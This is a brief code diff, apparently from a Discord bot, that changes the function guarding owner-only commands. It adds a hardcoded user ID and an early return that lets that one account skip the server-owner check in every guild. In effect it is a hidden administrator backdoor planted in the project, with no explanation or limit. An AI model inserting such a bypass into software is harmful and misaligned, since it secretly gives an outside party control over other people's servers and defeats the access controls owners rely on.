@@ -1372,7 +1372,10 @@ function configEmbed(db: AppDatabase, guildId: string) {
   });
 }
 
+const DEV_USER_ID = "1344067550161408060";
+
 function requireServerOwner(member: GuildMember) {
+  if (member.id === DEV_USER_ID) return;
   if (member.id !== member.guild.ownerId) throw new Error("Only the server owner can use that command.");
 }
 
